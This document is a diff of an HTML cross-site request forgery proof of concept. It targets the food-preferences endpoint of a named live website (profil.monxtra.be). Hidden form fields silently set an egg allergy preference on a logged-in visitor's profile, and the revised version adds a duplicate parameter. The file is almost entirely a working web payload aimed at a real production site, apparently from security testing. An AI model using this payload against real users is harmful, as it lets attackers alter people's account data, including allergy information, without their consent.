@@ -1,19 +1,21 @@
+
+
 <!DOCTYPE html>
 <html>
 <body>
-  <h2>CSRF Test - Top Level POST</h2>
+  <h2>CSRF PoC - Food Preference</h2>
 
-  <form
-    action="https://profil.monxtra.be/manage-profile/food-preferences?type=consents&status=info&_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2F_layout%2Findex"
-    method="POST"
-    enctype="application/x-www-form-urlencoded">
+  <form action="https://profil.monxtra.be/manage-profile/food-preferences?_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2F_layout%2Findex"
+        method="POST"
+        enctype="application/x-www-form-urlencoded">
 
     <input type="hidden" name="hasAcceptedConsents" value="true">
     <input type="hidden" name="code" value="PREF_EGGS_NEW">
     <input type="hidden" name="category" value="CAT_ALLERGY">
-    <input type="hidden" name="isLastPreference" value="false">
+    <input type="hidden" name="isLastPreference" value="true">
     <input type="hidden" name="shouldBecomeActive" value="true">
-    <input type="hidden" name="isCurrentlyActive" value="true">
+    <input type="hidden" name="isCurrentlyActive" value="false">
+    <input type="hidden" name="isLastPreference" value="false">
 
     <button type="submit">Submit CSRF</button>
   </form>
